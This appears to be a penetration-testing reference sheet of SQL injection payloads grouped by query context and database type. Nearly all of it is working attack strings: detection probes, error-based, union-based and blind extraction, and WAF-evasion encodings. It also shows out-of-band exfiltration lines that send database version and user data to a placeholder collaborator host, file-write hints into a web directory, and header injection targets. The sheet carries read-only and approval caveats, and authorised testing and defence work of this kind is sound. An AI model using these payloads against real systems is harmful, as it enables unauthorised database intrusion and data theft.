# SQLi payloads by context + DBMS (shared by sqli-inband / sqli-blind)
# SELECT-safe only. No stacked/destructive queries. Confirm injection before extracting; extract read-only.

## Anomaly probes (detection — feeder)
```
'    "    )    '))    `       -> error / differential = candidate
1-0            (numeric context: if result == value for 1, injectable)
' AND '1'='1   vs   ' AND '1'='2         (string context boolean differential)
 AND 1=1       vs    AND 1=2             (numeric context)
```

## Query-context breakout
| context | break out with |
|---|---|
| string `'...'` | `'` then payload then `-- -` or `'||'` |
| numeric | no quote; ` AND `, arithmetic |
| identifier / ORDER BY | `1,(SELECT ...)` / `1 ASC--` ; column-count via `ORDER BY N` |
| LIKE | `%` and `'` |
| JSON | break the JSON string then the SQL string |

## In-band
```
# error-based (leak via error message)
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -        (MySQL)
' AND 1=cast((SELECT version()) as int)-- -                      (Postgres)
' AND 1=convert(int,(SELECT @@version))-- -                      (MSSQL)
# union-based (match column count + types)
' ORDER BY 5-- -                 (find column count)
' UNION SELECT NULL,NULL,version(),NULL,NULL-- -
```

## Blind
```
# boolean
' AND (SELECT substring(version(),1,1))='8'-- -
# time
' AND SLEEP(5)-- -                           (MySQL)
'; SELECT pg_sleep(5)-- -                     (Postgres — note: stacked; use only if safe + approved)
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))x)-- -
IF(1=1,SLEEP(5),0)                            (conditional time)
# OOB (where supported)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.OOB\\x'))-- -   (MySQL/Windows)
UTL_HTTP / DBMS_LDAP (Oracle) ; xp_dirtree (MSSQL)
```

## WAF bypass (minimal, escalate only if blocked)
```
/**/  inline comments, case toggling, URL/double-URL encoding, UNION/**/SELECT,
whitespace alt (%09,%0a), concat via 0x hex, scientific notation for numbers
```

## Tooling
`sqlmap -r req.txt --batch --level=N --risk=1 --technique=BEUST --dbms=<DBMS>` — use `--risk=1` (no
destructive), confirm findings MANUALLY, and do not dump real PII.

---
## Advanced — OOB exfil · no-space/WAF bypass · header SQLi

### Out-of-band (OOB) exfil by DBMS — attributable blind proof
Use when there is no in-band reflection and timing is slow/noisy. Fire a unique token to a collaborator.
```
# MySQL (Windows only; UNC path triggers SMB/DNS lookup). Precondition: secure_file_priv unset/permissive.
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.TOKEN.oob.example\\x'))-- -
#   file write (needs FILE priv + writable web dir + secure_file_priv): ... INTO OUTFILE '/var/www/html/x.txt'
#   check first:  SELECT @@secure_file_priv;    (empty = anywhere, NULL = disabled)
# MSSQL — DNS/UNC via xp_dirtree (no xp_cmdshell needed); exfil via bcp if command exec is approved.
'; EXEC master..xp_dirtree '\\TOKEN.oob.example\x'-- -
# Oracle — UTL_HTTP / UTL_INADDR (DNS) / UTL_TCP
' AND (SELECT UTL_INADDR.get_host_address('TOKEN.oob.example')) IS NOT NULL-- -
' AND (SELECT UTL_HTTP.request('http://TOKEN.oob.example/?d='||(SELECT user FROM dual)) FROM dual) IS NOT NULL-- -
```
`secure_file_priv` gates MySQL file read/write — always read it before claiming file-based OOB/RCE.

### No-space / WAF bypass (escalate only when a filter blocks the basic form)
```
# whitespace alternatives (any of these for a space):
%09 (tab)  %0a (LF)  %0c (FF)  %0d (CR)  %a0 (non-breaking)  /**/  ()
#   e.g.  'OR(1)=(1)-- -      'OR/**/1=1-- -      '%0aOR%0a1=1-- -
# keyword/char obfuscation:
CONCAT(0x61,0x62)            # hex literals, no quotes
CHAR(97,98)                  # build strings without quotes
UNION/**/SELECT   UniON SeLeCt   %55NION (url-encode first byte)
# double-URL-encode, scientific notation (1e0), comment-splitting /*!50000UNION*/
```

### Injection surface beyond params — HEADER SQLi
Test these sinks too (logged/stored → often reach SQL): `User-Agent`, `Referer`, `X-Forwarded-For`,
`X-Forwarded-Host`, `Cookie` values, and any custom header the app persists. Same payloads; confirm
the same way (error/boolean/time/OOB).
